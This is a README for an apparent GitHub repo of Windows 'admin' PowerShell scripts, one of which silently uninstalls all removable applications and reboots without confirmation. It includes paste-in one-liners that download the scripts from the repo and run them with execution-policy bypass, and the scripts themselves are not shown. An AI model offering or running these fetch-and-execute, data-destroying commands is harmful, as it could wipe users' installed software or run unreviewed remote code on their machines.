# Admin Setup

IT admin workstation scripts for Windows.

Repo: [e24g4vewetq3gwerb/Admin-setup](https://github.com/e24g4vewetq3gwerb/Admin-setup)

## Scripts

| File | Behavior |
|------|----------|
| [Admin-Setup.ps1](Admin-Setup.ps1) | Desktop icon, Yes/No offer for Grok Bot + Chrome, then wipe leftover apps and restart |
| [Clear-Apps-Restart.ps1](Clear-Apps-Restart.ps1) | **No Yes/No boxes.** Uninstalls removable apps, then restarts |

## Clear-Apps-Restart (silent)

No MessageBox. No Read-Host. No "are you sure?".

Windows UAC still appears if the process is not already elevated. That is the OS, not this script.

Keeps drivers, Visual C++ / .NET, Edge / WebView2, and non-removable system packages so the PC can still boot. Other Win32 programs with an uninstall string and removable Store apps are removed quietly.

### Download

- Script: https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Clear-Apps-Restart.ps1
- Repo file: https://github.com/e24g4vewetq3gwerb/Admin-setup/blob/main/Clear-Apps-Restart.ps1

### One-liner

```powershell
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\admin" | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Clear-Apps-Restart.ps1 -OutFile "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1"
Unblock-File "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1"
```

Wipe only (no reboot):

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Clear-Apps-Restart.ps1" -NoRestart
```

Cancel a pending reboot: `shutdown /a`

Log: `%USERPROFILE%\admin\Clear-Apps-Restart.log`

## Admin-Setup (prompted)

```powershell
New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\admin" | Out-Null
irm https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1 -OutFile "$env:USERPROFILE\admin\Admin-Setup.ps1"
Unblock-File "$env:USERPROFILE\admin\Admin-Setup.ps1"
powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\admin\Admin-Setup.ps1" -IconOnly
```
